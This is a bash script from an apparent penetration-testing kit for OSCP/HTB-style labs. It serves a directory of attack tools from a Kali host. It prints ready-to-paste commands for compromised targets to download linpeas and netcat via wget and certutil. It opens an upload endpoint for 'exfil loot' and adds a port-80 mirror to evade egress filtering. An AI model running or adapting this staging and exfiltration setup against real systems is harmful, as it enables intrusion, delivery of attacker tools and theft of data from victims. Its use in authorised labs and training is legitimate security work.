#!/bin/bash
# --- self-locate kit root (survives moving the whole tree) ---
KIT="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")/.." && pwd)"
# Serve the staged tool kit over HTTP. Usage: ./serve.sh [port]
# Server preference (each degrades gracefully to the next):
#   1. updog             - download + browser upload endpoint (exfil loot back to Kali)
#   2. fuzzy-httpserver  - typo-tolerant: serves the right file even if the wget path has a typo
#   3. python http.server - download only, always present
cd "$KIT/serve" || exit 1
PORT="${1:-7890}"

# Ports <1024 need root to bind; the default (7890) does not, so don't force a
# sudo password prompt when it isn't required.
SUDO=""
[ "$PORT" -lt 1024 ] && SUDO="sudo"

# --- auto-detect the VPN IP so the printed one-liners are paste-ready ---
# Prefer tun0 (OSCP/HTB/PG VPN); fall back to the first global-scope address.
KALI="$(ip -4 -o addr show tun0 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | head -n1)"
if [ -z "$KALI" ]; then
  KALI="$(ip -4 -o addr show scope global 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | head -n1)"
  [ -n "$KALI" ] && echo "[!] tun0 not found - using $KALI (not the VPN?). Fix the IP in the one-liners if wrong."
fi
KALI="${KALI:-<KALI>}"

echo "[*] Serving $(pwd) on 0.0.0.0:$PORT  (Kali IP: $KALI)"
echo "    Linux:    wget http://$KALI:$PORT/linux/linpeas.sh -O /tmp/lp.sh"
echo "    Windows:  certutil -urlcache -f http://$KALI:$PORT/windows/nc.exe nc.exe"

# --- also stage a download-only mirror on port 80 ---------------------------
# Many lab/exam targets egress-filter high ports but allow outbound 80. This
# background python http.server mirrors the same dir on :80 so a wget to 80
# just works. Binding 80 needs root; if that's unavailable or 80 is busy we
# warn and carry on with the primary server only. Set STAGE80=0 to skip.
STAGE80="${STAGE80:-1}"
MIRROR_PID=""
cleanup() { [ -n "$MIRROR_PID" ] && kill "$MIRROR_PID" 2>/dev/null; }
trap cleanup EXIT INT TERM

if [ "$STAGE80" = "1" ] && [ "$PORT" != "80" ]; then
  if ss -tlnH 'sport = :80' 2>/dev/null | grep -q .; then
    echo "[!] port 80 already in use - skipping the :80 mirror"
  # Cache the sudo credential in the foreground first (prompts once if needed)
  # so the backgrounded server doesn't stall on SIGTTIN waiting for a password.
  elif ! sudo -v 2>/dev/null; then
    echo "[!] no sudo for :80 - primary server only (run 'sudo -v' then re-launch, or use the primary port)"
  else
    sudo python3 -m http.server 80 --bind 0.0.0.0 --directory "$(pwd)" >/dev/null 2>&1 &
    MIRROR_PID=$!
    sleep 0.3
    if kill -0 "$MIRROR_PID" 2>/dev/null; then
      echo "    [:80 mirror] wget http://$KALI/linux/linpeas.sh -O /tmp/lp.sh   (download-only)"
    else
      MIRROR_PID=""
      echo "[!] could not bind :80 - primary server only"
    fi
  fi
fi

if command -v updog >/dev/null; then
  echo "    (updog: browser upload at http://$KALI:$PORT/upload - exfil loot back; uploads land in $(pwd))"
  $SUDO "$(command -v updog)" -d . -p "$PORT"
elif command -v fuzzy-httpserver >/dev/null; then
  echo "    (fuzzy-httpserver: typo-tolerant matching enabled; download only)"
  $SUDO "$(command -v fuzzy-httpserver)" -p "$PORT" -d .
else
  echo "    (python http.server: download only. 'pip install updog' to add an upload endpoint.)"
  $SUDO python3 -m http.server "$PORT"
fi
